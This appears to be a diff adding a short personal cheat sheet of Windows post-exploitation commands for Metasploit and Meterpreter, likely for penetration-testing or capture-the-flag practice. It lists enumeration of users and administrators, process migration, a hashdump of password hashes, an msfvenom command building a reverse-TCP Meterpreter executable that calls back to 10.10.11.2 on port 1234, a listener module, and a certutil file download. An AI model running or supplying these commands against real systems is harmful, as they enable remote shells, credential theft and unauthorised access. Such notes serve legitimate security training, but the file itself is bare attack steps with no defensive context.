@@ -1,0 +1,25 @@
+Windows Enumeration command:
+
+-sysinfo	(MSF)
+
+-pgrep explorer ----> migrate (output pgrep explorer)	(MSF)	//from x32 to x64 meterpreter
+
+-getprivs //used to see user priv
+
+-net user //see all account on windows
+
+-net localgroup administrators //see the administrator group
+
+-ps 	(MSF)	//process listing
+
+-hashdump
+
+-search -f <Name File> //search fo a file
+
+-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.11.2 LPORT=1234 -f exe > payload.exe
+
+-exploit/multi/handler (metasploit module to set listening port)
+
+-certutil -urlcache -f URL NEW_NAME
+
+-session -u NUMBER (Upgrade session to meterpreter)
